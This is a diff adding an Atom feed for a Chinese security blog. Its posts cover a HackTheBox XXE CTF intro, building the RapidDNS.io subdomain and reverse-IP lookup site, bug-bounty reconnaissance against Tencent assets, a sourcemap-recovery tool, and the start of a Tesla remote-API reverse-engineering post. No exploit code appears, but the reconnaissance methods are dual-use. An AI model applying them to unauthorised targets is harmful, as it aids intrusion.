@@ -1,0 +1,1165 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://bacde.me</id>
+    <title>BaCde&apos;s Blog</title>
+    <updated>2021-06-08T03:33:22.850Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://bacde.me"/>
+    <link rel="self" href="https://bacde.me/atom.xml"/>
+    <subtitle>在攻与防的对立与统一中需求突破。</subtitle>
+    <logo>https://bacde.me/images/avatar.png</logo>
+    <icon>https://bacde.me/favicon.ico</icon>
+    <rights>All rights reserved 2021, BaCde&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[Cyber Apocalypse 2021 Web Artillery WriteUP]]></title>
+        <id>https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/</id>
+        <link href="https://bacde.me/post/Cyber-Apocalypse-2021-Web-Artillery-WriteUP/">
+        </link>
+        <updated>2021-04-28T07:15:04.000Z</updated>
+        <summary type="html"><![CDATA[<p>大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。</p>
+<h2 id="收集信息">收集信息</h2>
+<p>此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>大家好，我是BaCde，上周临时组队参与了HackTheBox组织的Cyber Apocalyps 2021的CTF比赛。今天主要写一下Web的Artillery，这是一道3星题（最难为4星），这是一道关于XXE利用的题，做出来的人相对很少，也花了不少时间，有些收获，这里写出来与大家分享。本文不介绍基础知识，如果要学习基础可以查看后面的推荐文章。</p>
+<h2 id="收集信息">收集信息</h2>
+<p>此次的CTF题大部分都提供源代码，并提供有Dockerfile文件，可通过docker build构建并运行。通过源码可知源代码为Java语言。openjdk 1.8.181版本，Web Server为Tomcat10。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我是如何低成本建立RapidDNS.io网站的]]></title>
+        <id>https://bacde.me/post/RapidDNS-03/</id>
+        <link href="https://bacde.me/post/RapidDNS-03/">
+        </link>
+        <updated>2021-03-22T11:58:23.000Z</updated>
+        <summary type="html"><![CDATA[<p>大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。</p>
+<p>RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。</p>
+<p>接下来我就跟大家分享建设这个网站的过程。</p>
+<h2 id="产生想法">产生想法</h2>
+<p>2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。</p>
+<p>有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。</p>
+<h2 id="面临的问题">面临的问题</h2>
+<p>开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。</p>
+<p>先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。</p>
+<p>因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。</p>
+<p>另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。</p>
+<p>但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。</p>
+<h2 id="解决方案">解决方案</h2>
+<p>经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1616415608484.png" alt="" loading="lazy"></figure>
+<p>本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。</p>
+<p>外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。</p>
+<p>这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。</p>
+<p>以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。</p>
+<h2 id="编码">编码</h2>
+<p>需要的一些基础知识：</p>
+<ol>
+<li>html+javascript+css基础</li>
+<li>python+flask基础</li>
+<li>elasticsearch基础</li>
+</ol>
+<p>其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。</p>
+<p>主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。</p>
+<p>后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：</p>
+<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1616415600955.png" alt="" loading="lazy"></figure>
+<p>创建mapping：</p>
+<pre><code>{
+  &quot;mappings&quot;: {
+    &quot;domain&quot;: {
+      &quot;properties&quot;: {
+        &quot;name&quot;: {
+          &quot;type&quot;: &quot;text&quot;
+
+        },
+        &quot;type&quot;: {
+          &quot;type&quot;: &quot;keyword&quot;
+
+        },
+        &quot;value&quot;: {
+          &quot;type&quot;: &quot;ip&quot;
+
+        },
+        &quot;domain&quot;: {
+          &quot;type&quot;: &quot;keyword&quot;
+
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。</p>
+<p>修改index设置的方法：</p>
+<pre><code>{
+  &quot;index&quot;: {
+    &quot;refresh_interval&quot;: -1,
+    &quot;number_of_replicas&quot;: 0
+  }
+}
+</code></pre>
+<p>导入完成后在修改回去即可。</p>
+<p>以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。</p>
+<h2 id="总结">总结</h2>
+<p>其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。</p>
+<p>希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。</p>
+<p>最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。<br>
+所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。</p>
+<p>大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。</p>
+<center>
+<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615992545149.jpg" alt="" loading="lazy"></figure>
+</center>
+]]></summary>
+        <content type="html"><![CDATA[<p>大家好！我是BaCde，2020年3月我着手开发RapidDNS这个网站，并于2020年4月1日正式上线。</p>
+<p>RapidDNS.io是一个在线域名查询和IP反向查询的网站。有超过25亿条记录，支持5种（A,AAAA,CNAME,MX,CERT）数据类型。到目前为止，网站全球Alexa排名15万左右并累计提供超过1亿次查询。现每月网站流量超过1TB。除此之外网站也被加入到Amass，OneForAll，theHarvester，Sudomy，subfinder，ksubdomain等众多知名开源项目中。</p>
+<p>接下来我就跟大家分享建设这个网站的过程。</p>
+<h2 id="产生想法">产生想法</h2>
+<p>2020年在做子域名收集的开发时，想起了Rapid7的DNS数据。经过对其进行分析后，确认是我需要的内容。于是便有了做一个在线的网站的想法，即方便自己同时又可以方便其他有需要的人。</p>
+<p>有了这个想法后就开始计划目标，确定只做子域名查询和IP地址反查。其实在开发时，想自己跑数据，但是资源有限。就决定先以Rapid7的DNS数据来尝试。后续也可根据具体情况在增加功能。</p>
+<h2 id="面临的问题">面临的问题</h2>
+<p>开始实现之前要考虑如何以最低的成本实现最好的效果。最好的效果即在多人同时访问时保证查询速度和系统稳定。因为这将直接决定采用什么样的架构来实现。</p>
+<p>先来分析下建设网站需要的东西。包括一个域名和至少一台服务器，用来存放web和数据。数据存储的空间至少要300gb，cpu至少双核，内存至少4g。这是没有增量和保存历史记录的情况。到各家云厂商,idc机房，根据这个配置对比了其价格，最低的服务器成本也要5000块一年（仅是数据存储）。</p>
+<p>因为打算做免费网站，这样的成本超出了我的预期，而且也可能性能不够。对于这个数据，国外已经有几篇数据运用的文章。其实现的思路有：1. 采用aws的Athena实现，2. 开源的DNSGrep，包括RapidDNS上线后采用mongodb实现的开源项目等。因为大多数围绕的是子域名查询，没有IP地址反查功能。而且Athena将随着用户数量增加，其费用也将非常恐怖，更适合自用。说了这么多，主要的问题说白了就是穷。</p>
+<p>另外一个省钱的思路就是从已有资源来想办法，这时想到了跟随我多年联想的笔记本电脑，它已经吃灰好久了，这是一个可利用的资源。这样只需要再买一个web服务器就可以了。根据之前调查的价格，这样的服务器一年大概需要不到2000块。</p>
+<p>但是这就产生了另外一个问题，家里的网络是光纤，没有固定ip地址，而且之前测试发现外网ip是无法直接访问的，映射端口是不行的。做端口转发？这个的性能没测试过，无法保证，也不打算采用。当然这里我想到了一个解决办法，在下面的内容中会讲到。</p>
+<h2 id="解决方案">解决方案</h2>
+<p>经过上面的考虑，最终我采用下面的结构。后来经过线上的运行情况，稳定性和查询速度还在接受的范围内。后续也可以增加worker和消息队列来支持其他方式的数据增加。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1616415608484.png" alt="" loading="lazy"></figure>
+<p>本地服务器就是我的一台笔记本电脑，其配置是3代i7，8G内存。1.2TB的固态硬盘(1TB+250TB两块组成)。数据存储与查询使用的是elasticsearch，前面加了一层nginx，并配置了认证。</p>
+<p>外部服务器是一台云主机，配置好为双核4G内存。包括nginx反向代理和Flask做的web查询界面。 外面又加了一层CDN。上面没有公网IP的问题，取了个巧，因为现在家里的网络都支持IPv6，所以外部服务器直接使用IPv6地址直连家里的笔记本电脑。</p>
+<p>这里说点额外的，对于IPv6地址是可以直接连接的，不需要做映射。一般我们家里的电脑会分配多个IPv6地址，有至少一个临时（temporary，我们连接其他电脑时使用）的地址和secured的。一般我们可以设置一个固定的即可。这里大家还是注意点，避免泄漏IPv6地址。之前看一篇公众号文章，发现对目标的IPv4地址打码了，却没有对IPv6地址打码，这个挺危险的。</p>
+<p>以上这套结构的成本为域名450元，cdn服务器免费的，服务器每月费用20美元（差不多140元），电费每月大概60元。前期投入买了一块三星的SSD，成本1000元。截止目前为止，共投入450+2400+1000=3850元。后续维持现状基本是服务器加域名成本，一年2850元。</p>
+<h2 id="编码">编码</h2>
+<p>需要的一些基础知识：</p>
+<ol>
+<li>html+javascript+css基础</li>
+<li>python+flask基础</li>
+<li>elasticsearch基础</li>
+</ol>
+<p>其实想好了方案，而且本身也不复杂，具体编码就相对简单了许多。比如查询界面的开发，我直接找了一套现成的模版，改改样式就可以了。后端flask边看文档边开发就可以了，没啥好说的。唯一要说一下的是这里flask使用了协程，其查询效果好了很多。当然后面跟insight-labs的A牛沟通过可以换bjoern，据说效果很好，不过这个我没测试，感兴趣的可以试试看，看完也可以分享出来让我学习学习。</p>
+<p>主要的还是在Elasticsearch这里，这里选择他主要因为我比较熟悉，而且有IP字段类型，做IP段查询时非常方便。这里换乘其他的如mongodb、mysql等也可以。mysql使用myisam，加上Partition问题也不大，Insight-labs的QQ群数据查询就是成功案例。大家可以选择自己擅长的。</p>
+<p>后来有朋友过来交流查询速度问题，说他那边的查询速度没我的快。其实主要我这边做了一些优化处理。我在导入数据时，对域名处理，将根域名单独存放一个字段，剩下的部分单独放一个字段。因为不需要模糊匹配，查询速度就会非常快，同时存储空间也可以节省几十G。当然，这牺牲掉了模糊搜索的功能。具体字段可以看下图：</p>
+<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1616415600955.png" alt="" loading="lazy"></figure>
+<p>创建mapping：</p>
+<pre><code>{
+  &quot;mappings&quot;: {
+    &quot;domain&quot;: {
+      &quot;properties&quot;: {
+        &quot;name&quot;: {
+          &quot;type&quot;: &quot;text&quot;
+
+        },
+        &quot;type&quot;: {
+          &quot;type&quot;: &quot;keyword&quot;
+
+        },
+        &quot;value&quot;: {
+          &quot;type&quot;: &quot;ip&quot;
+
+        },
+        &quot;domain&quot;: {
+          &quot;type&quot;: &quot;keyword&quot;
+
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>最关键的其实是导入程序，也是投入时间最多的，因为数据量比较多。单纯使用bulk速度很慢。使用SSD速度会提高几倍。但是依然达不到预期，因为会出现es内存耗尽，队列太多等各种异常，比如导入到8亿多数据时报错。也尝试通过迭代的方式来实现高性能文件读取，但是最后主要的根源还是在es和字符串的处理上。最后采用多进程方式。elasticsearch设置不刷新，0副本，并调整es的queue，线程，最大内存等参数。这个需要根据自己机器配置去进行调整。通过实际使用一天导入大概10亿条记录，当然还是有优化空间的。</p>
+<p>修改index设置的方法：</p>
+<pre><code>{
+  &quot;index&quot;: {
+    &quot;refresh_interval&quot;: -1,
+    &quot;number_of_replicas&quot;: 0
+  }
+}
+</code></pre>
+<p>导入完成后在修改回去即可。</p>
+<p>以上elasticsearch使用的是6.7.1版本。其他版本可能会有差异，根据实际情况调整即可。</p>
+<h2 id="总结">总结</h2>
+<p>其实总体来说，本文技术上没啥复杂度，实现起来也相对简单。我觉得有点像以前革命时期八路军的风格（完了往自己脸上贴金了，勿喷），在有限的条件下来尽可能实现自己想要的效果。</p>
+<p>希望本文对你有所帮助，对于上述内容有任何疑问，可以给我发送消息一起交流。</p>
+<p>最后，RapidDNS已经一周年，这一年家人和同事的支持，同学的帮助，以及国内外朋友的称赞和鼓励，才让我坚持维护着网站运行。感谢在网站运行中大家提来的建议和反馈！感谢所有使用RapidDNS的人！感谢你们让RapidDNS更好。<br>
+所以，RapidDNS现有查询功能将一直免费开放下去，同时新的一年我也会增加新的功能，也欢迎大家发来你们的建议和想法。</p>
+<p>大家也可以关注公众账号，获取最新的网站功能、使用技巧等内容。</p>
+<center>
+<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615992545149.jpg" alt="" loading="lazy"></figure>
+</center>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[RapidDNS网站在SRC漏洞挖掘中的一个思路]]></title>
+        <id>https://bacde.me/post/RapidDNS-02/</id>
+        <link href="https://bacde.me/post/RapidDNS-02/">
+        </link>
+        <updated>2021-03-17T14:46:07.000Z</updated>
+        <summary type="html"><![CDATA[<p>大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。</p>
+<p>首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。</p>
+<p>当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。</p>
+<p>像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。</p>
+<p>RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>大家好，我是BaCde。今天给大家分享一下我这个月提交鹅厂漏洞的一个挖掘思路。</p>
+<p>首先说一下结果，一个SQL注入（可报错回显）、弱口令（审核后发现是域名解析IP错误）和一个有限的SSRF漏洞。</p>
+<p>当然今天我要说的不是直接查询子域名，那就没必要写这篇文章了。</p>
+<p>像鹅厂这样规模的企业，其资产数量众多。同样的，其盯着他的大佬们也非常多。而目前收集信息的方法大多数都差不多。本身厂商自己也会对其进行监控、检测。基本上很多被筛选了很多遍。那应该如何去挖掘呢？其中一种思路就是找到别人未发现的一些资产，这将增加挖掘的概率。</p>
+<p>RapidDNS网站在2020年12月的时候增加了5000万的HTTPS证书数据。暂时还没有对证书查询独立（将在新上线的版本独立查询）。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[RapidDNS.IO 网站应用实例]]></title>
+        <id>https://bacde.me/post/rapiddnsio-tips/</id>
+        <link href="https://bacde.me/post/rapiddnsio-tips/">
+        </link>
+        <updated>2021-03-11T02:23:49.000Z</updated>
+        <summary type="html"><![CDATA[<p>大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。</p>
+<p>网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。</p>
+<p>首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1615429646070.png" alt="" loading="lazy"></figure>
+<p>下面来说下实际应用场景。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。</p>
+<p>比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。</p>
+<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1615429652715.png" alt="" loading="lazy"></figure>
+<p>下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。</p>
+<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615429659028.png" alt="" loading="lazy"></figure>
+<h2 id="溯源定位">溯源定位</h2>
+<p>这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。</p>
+<p>这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？</p>
+<p>今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。</p>
+<p>其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。</p>
+<figure data-type="image" tabindex="4"><img src="https://bacde.me/post-images/1615429676971.png" alt="" loading="lazy"></figure>
+<p>在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。</p>
+<figure data-type="image" tabindex="5"><img src="https://bacde.me/post-images/1615429683321.png" alt="" loading="lazy"></figure>
+<p>好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。</p>
+<p>扫描篇下方二维码可关注公众号</p>
+<figure data-type="image" tabindex="6"><img src="https://bacde.me/post-images/1615429807479.jpg" alt="" loading="lazy"></figure>
+]]></summary>
+        <content type="html"><![CDATA[<p>大家好，我是BaCde。公众号开通了2个月，一直没发内容。本来计划写写网站建设思路，今天先写一篇网站的使用分享。</p>
+<p>网站自发布以来，一直没有什么说明和教程。因为它的功能非常单一，不需要做太多介绍。但是呢，有一些小细节和场景，我觉得可以分享下。</p>
+<p>首先，网站基础功能可以查询网站子域名，根据IP地址或IP段查询绑定的域名信息，这里支持IPv6的地址和地址段。目前最大支持显示1万条（大多数情况下足够了）。其中查询结果页面中有导出csv的功能，可以导出全部结果。其实不导出，查询全部结果只需要加入参数?full=1即可。目前大多数开源工具采集时采用也是这样的方式。</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1615429646070.png" alt="" loading="lazy"></figure>
+<p>下面来说下实际应用场景。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>在收集ASN信息时，可以根据反向IP段查询，迅速确定筛选出目标的资产。</p>
+<p>比如下图中搜索到的腾讯结果中，有很多ip段时属于腾讯云服务的机器，这些IP对我们挖掘漏洞来说，意义不大。但是可能又会存在夹杂在其中的个别目标。这时候就可以使用Reverse IP功能进行查询，然后筛选出目标或者筛选IP段。</p>
+<figure data-type="image" tabindex="2"><img src="https://bacde.me/post-images/1615429652715.png" alt="" loading="lazy"></figure>
+<p>下面随便挑了一个（58.87.64.0/18）查询结果来展示下，发现大多数不是腾讯的域名，则可以跳过，或者从中筛选出腾讯的。</p>
+<figure data-type="image" tabindex="3"><img src="https://bacde.me/post-images/1615429659028.png" alt="" loading="lazy"></figure>
+<h2 id="溯源定位">溯源定位</h2>
+<p>这里主要说两个场景，第一个就是扫到某个IP存在漏洞，想知道哪个厂商的，第二个就是对于攻击IP地址是属于哪个机构的。这是两个非常常见的需求。</p>
+<p>这里一种方法是直接查询IP地址，那么，当ip地址查不到时怎么办呢？</p>
+<p>今天就在微信群里遇到一个例子。有人在日志中发现了360某团队的一个dnslog的地址，但是打开其域名时一个空白地址。这里我通过获取到解析的IP地址，查询C段，然后很快速的发现了dnslog平台的登录地址，根据版权信息确认是360的。</p>
+<p>其发现的地址形如：xxx.b.nslog.0kee.360.cn。访问nslog.0kee.360.cn为空白，其解析的IP地址为123.59.211.124。通过RapidDNS来查询C段，查询链接：https://rapiddns.io/sameip/123.59.211.124/24#result。</p>
+<figure data-type="image" tabindex="4"><img src="https://bacde.me/post-images/1615429676971.png" alt="" loading="lazy"></figure>
+<p>在结果中可以发现一个0kdns.net的域名，访问后就是dnslog平台登录地址。</p>
+<figure data-type="image" tabindex="5"><img src="https://bacde.me/post-images/1615429683321.png" alt="" loading="lazy"></figure>
+<p>好了，以上就是我经常使用到的方法，跟大家分享出来。另外，网站由于网络原因，可能会不太稳定。有问题大家可即时反馈，看到后我会第一时间来解决。</p>
+<p>扫描篇下方二维码可关注公众号</p>
+<figure data-type="image" tabindex="6"><img src="https://bacde.me/post-images/1615429807479.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SourceMapX——批量扫描并恢复sourcemap的源代码文件]]></title>
+        <id>https://bacde.me/post/sourcemapx/</id>
+        <link href="https://bacde.me/post/sourcemapx/">
+        </link>
+        <updated>2021-02-28T14:14:42.000Z</updated>
+        <summary type="html"><![CDATA[<p>SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。</p>
+<p>项目地址:<br>
+<a href="https://github.com/insightglacier/SourceMapX">https://github.com/insightglacier/SourceMapX</a></p>
+<h2 id="安装">安装</h2>
+<p>该脚本主要由<a href="https://github.com/rarecoil/unwebpack-sourcemap">unwebpack-sourcemap</a>项目修改而来，使用Python3编写,需要安装 <code>BeautifulSoup4</code> and <code>requests</code>.可以使用 <code>pip3 install -r requirements.txt</code>命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>SourceMapX是一个批量扫描并恢复sourcemap的源代码文件的脚本。</p>
+<p>项目地址:<br>
+<a href="https://github.com/insightglacier/SourceMapX">https://github.com/insightglacier/SourceMapX</a></p>
+<h2 id="安装">安装</h2>
+<p>该脚本主要由<a href="https://github.com/rarecoil/unwebpack-sourcemap">unwebpack-sourcemap</a>项目修改而来，使用Python3编写,需要安装 <code>BeautifulSoup4</code> and <code>requests</code>.可以使用 <code>pip3 install -r requirements.txt</code>命令进行安装。主要是修改为批量检测并下载，可用于SRC的漏洞挖掘。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hacking all the cars之Tesla API分析与利用（下）]]></title>
+        <id>https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/</id>
+        <link href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-two/">
+        </link>
+        <updated>2020-11-14T03:57:41.000Z</updated>
+        <summary type="html"><![CDATA[<p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容<a href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/">Hacking All The Cars - Tesla 远程API分析与利用（上）</a>。</p>
+<h2 id="0x00-websocket通信分析">0x00 Websocket通信分析</h2>
+<p>Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。</p>
+<p>在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。</p>
+<p><img src="https://bacde.me/post-images/1605326984308.png" alt="" loading="lazy"><img src="/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png" alt="" loading="lazy"></p>
+<p>在这个时候就需要还一个工具了，本文选择使用charles。这个工具针对websocket的支持非常友好，不仅可以看到请求头，还针对发送与接收以不同的颜色区分显示出来，十分方便分析。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。该篇文章为第二篇，将主要讲解websocket抓包分析与编程实现对Tesla的远程控制。如果你还没看第一篇，请先查看第一篇内容<a href="https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/">Hacking All The Cars - Tesla 远程API分析与利用（上）</a>。</p>
+<h2 id="0x00-websocket通信分析">0x00 Websocket通信分析</h2>
+<p>Tesla的召唤功能除自动召唤外，还支持手动的前进与后退功能。要想手机APP可以使用召唤功能，需要先在车机中开启召唤功能。</p>
+<p>在测试时，建议寻找一块比较大的空地，然后设置抓包，使用手机APP进行操作。通过burpsuite抓到的数据包可知，召唤功能主要通过websocket来实现。但是分析过程中可以发现，burpsuite只显示了连接地址和发送的数据内容，并没有显示其请求的头，所以，当直接去连接时会返回401错误。</p>
+<p><img src="https://bacde.me/post-images/1605326984308.png" alt="" loading="lazy"><img src="/Users/aliceclaudia/work/Blog/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6tesla%E5%AE%9E%E7%8E%B0/%E4%B8%8B/images/ppt/04_tesla_websockets.png" alt="" loading="lazy"></p>
